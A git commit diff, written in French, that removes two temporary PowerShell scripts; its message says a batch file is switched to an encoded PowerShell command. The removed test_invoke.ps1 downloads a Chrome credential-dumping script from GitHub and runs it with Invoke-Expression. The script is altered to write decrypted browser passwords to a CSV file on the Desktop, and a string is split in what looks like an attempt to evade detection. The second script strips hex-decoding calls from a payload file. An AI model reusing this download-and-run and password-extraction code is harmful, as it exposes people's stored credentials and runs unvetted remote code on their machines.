503ecb839ac423bd8284bb2efd416b2940425651
aleex-le-dev <jalias59@outlook.fr>
2026-03-01 20:04:36 +0100

    Modifie Scripts-by-AleexLeDev.bat pour utiliser une commande PowerShell encodée et supprime de nombreux scripts temporaires.

--- test_invoke.ps1
+++
@@ -1,5 +0,0 @@
-$c = (Invoke-WebRequest 'https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1' -UseBasicParsing).Content
-$c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
-$c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
-$c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
-Invoke-Expression $c
--- test_regex.ps1
+++
@@ -1,3 +0,0 @@
-$c = Get-Content 'payload_temp.txt' -Raw
-$c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '$null'
-Set-Content "regex_fixed.ps1" -Value $c
